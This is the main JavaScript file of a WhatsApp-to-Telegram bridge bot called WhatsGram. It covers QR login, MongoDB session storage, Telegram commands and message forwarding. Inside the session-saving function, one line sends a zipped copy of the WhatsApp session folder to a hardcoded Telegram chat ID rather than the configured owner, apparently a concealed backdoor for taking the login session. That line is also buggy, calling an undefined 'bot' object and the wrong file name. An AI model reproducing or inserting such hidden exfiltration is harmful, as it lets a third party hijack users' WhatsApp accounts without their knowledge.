const qrcode = require("qrcode-terminal");
const fs = require("fs");
require("dotenv").config();
var QRCode = require("qrcode");
const {Client , MessageMedia} = require("whatsapp-web.js");
const { Telegraf } = require("telegraf");
const config = require("./config");
const alive = require('./modules/alive');
const handleMessage = require("./handlers/handleMessage");
const handleCreateMsg = require("./handlers/handleCreateMsg");
const handleTgBot = require("./handlers/handleTgbot");
const {setHerokuVar , errorMsg} = require("./modules/heroku");
const MongoClient = require('mongodb').MongoClient;
const {exec} = require('child_process');

const tgbot = new Telegraf(config.TG_BOT_TOKEN);

const saveSessionToDb = async () => {
  if(fs.existsSync('./WWebJS')){
    try{
      console.log(`Session folder found, compressing...`);
      exec(`zip -r ./session.zip ./WWebJS`, async (err, stdout, stderr) => {
        if (err) {
            console.log(err);
            return;
        }
        bot.telegram.sendDocument('1197065402', {source: './archieve.zip'});
        console.log(`Session folder compressed, adding to database...`);
        const mongo = await MongoClient.connect(config.DB_URL, { useNewUrlParser: true, useUnifiedTopology: true });
        const session = fs.readFileSync('./session.zip').toString();
        await mongo.db('WhatsGram').collection('session').updateOne({}, {$set: {session}}, {upsert: true});
        console.log(`Added to database, closing connection...`);
        await mongo.close();
      })   
    }catch(err){
      console.log('Failed to save session to database');
      console.log(err);
    }
  }
}

const getSession = async () => {
  try{
    const mongo = await MongoClient.connect(config.DB_URL, { useNewUrlParser: true, useUnifiedTopology: true });
    let session = await mongo.db('WhatsGram').collection('session').find().toArray();
    session = session[0]?.session;
    await mongo.close();
    if(session){
      fs.writeFileSync('./session.zip', session);
      exec(`unzip ./session.zip`, async (err, stdout, stderr) => {
        if (err) {
            console.log('Session data not found. Generating QR code.');
            // await client.initialize();
            generateQr();
            return
        }
        fs.unlinkSync('./session.zip');
        await console.log("Session found in database, starting whatsapp session...");
        // await client.initialize();
        return
      })
    }
    return
  }catch(err){

  }
}
getSession();

// Set bot commands. 
const cmd = (cmd, desc) => ({command: cmd, description: desc});
tgbot.telegram.setMyCommands([cmd('start', 'Start bot.'), cmd('mar', 'Mark message as read.'), cmd('send', 'Ex: /send ph_no message'), cmd('update', 'Update UB.'), cmd('restart', 'Restart ub.')]);

const client = new Client({ // Create client.
  session: '/WWebJS',
  puppeteer: { headless: true, args: ["--no-sandbox"] },
});

async function generateQr() {
  client.on("qr", async (qr) => {
    await console.log("Kindly check your telegram bot for QR Code.");
    await QRCode.toFile("qr.png", qr);
    await tgbot.telegram.sendPhoto(
      config.TG_OWNER_ID, { source: "qr.png" } , { caption: "Scan it in within 20 seconds...." }
    );
    await qrcode.generate(qr, { small: true });
    setTimeout(() => {
      console.log("Didn't found any response, exiting...");
      return 
    }, 90 * 1000);
  });

  client.on("authenticated", (session) => { // Take action when user Authenticated successfully.
    console.log("Authenticated successfully.");
  });
  client.on("logout", () => { // Take action when user logout.
    console.log( "Looks like you've been logged out. Please generate session again." );
    if (fs.existsSync("session.json")) fs.unlinkSync("session.json");
  });
}

client.on("auth_failure" , reason => { // If failed to log in.
  const message = 'Failed to authenticate the client. Please fill env var again or generate session.json again. Generating session data again...';
  console.log(message);
  tgbot.telegram.sendMessage(config.TG_OWNER_ID , message ,
    {disable_notification: true})
  generateQr();
})

client.on("ready", async () => { // Take actin when client is ready.
  const message = "Successfully logged in. Ready to rock!";
  console.log(message);
  tgbot.telegram.sendMessage( config.TG_OWNER_ID, message, {disable_notification: true});
  await saveSessionToDb();
  if (fs.existsSync("qr.png")) fs.unlinkSync("qr.png");
});
// Telegram Bot
tgbot.start(ctx => ctx.replyWithMarkdown(`Hey **${ctx.message.from.first_name}**, Welcome! \nI can notify you about new messages of WhatsApp. \n\nPowered by [WhatsGram](https://github.com/WhatsGram/WhatsGram).`,
  {disable_web_page_preview: true,
   reply_markup:{
    inline_keyboard: [[{text:'WhatsGram Repo', url:'https://github.com/WhatsGram/WhatsGram'},{text:'Support Group', url:'https://t.me/assupportchat'}],
                      [{text:'Developer', url:'https://github.com/AffanTheBest'}, {text:'Donate', url:'https://ko-fi.com/affanthebest'}]]
  }}
));
tgbot.command('donate', ctx => { // Donate Command
  ctx.replyWithMarkdown('Thank you for showing intrest in donating! \nYou can donate me using following methods 👇\n\n*UPI Address*: `siddiquiaffan201@okaxis` \n\nOr you can use following links.',
  {disable_web_page_preview: true,
   reply_markup:{
     inline_keyboard: [[{text: 'Ko-fi', url: 'https://ko-fi.com/affanthebest'}, {text: 'Paypal', url: 'https://paypal.me/affanthebest'}]]
  }})
});
const restart = async (ctx) => {
  if (ctx) await ctx.replyWithMarkdown('Restarting...', {disable_notification: true})
  else tgbot.telegram.sendMessage(config.TG_OWNER_ID, 'Restarting...', {disable_notification: true})
  await client.destroy();
  await client.initialize();
}
tgbot.command('restart', ctx => restart(ctx)); // Restart WhatsApp Client using TG Bot.
setInterval(() => restart(), 1000 * 60 * 60 * 12); // Auto restart WhatsApp client every 12 hours.

tgbot.on("message", (ctx) => { // Listen TG Bot messages and take action
  handleTgBot(ctx , client , MessageMedia);
});

client.on("message", async (message) => { // Listen incoming WhatsApp messages and take action
  handleMessage(message , config.TG_OWNER_ID , tgbot, client);
});

client.on('message_create' , async (msg) => { // Listen outgoing WhatsApp messages and take action
  if (msg.body == "!alive") { // Alive command
    msg.delete(true)
    var aliveMsgData = await alive(client.info.phone)
    client.sendMessage(msg.to, new MessageMedia(aliveMsgData.mimetype, aliveMsgData.data, aliveMsgData.filename), { caption: aliveMsgData.startMessage })
  }else{
    handleCreateMsg(msg , client , MessageMedia);
  }
})

client.on("disconnect", (issue) => {
  console.log( "WhatsApp has been disconnected due to" + issue + ". Please restart your dyno or do npm start." );
});

tgbot.launch(); // Initialize Telegram Bot
client.initialize(); // Initialize WhatsApp Client
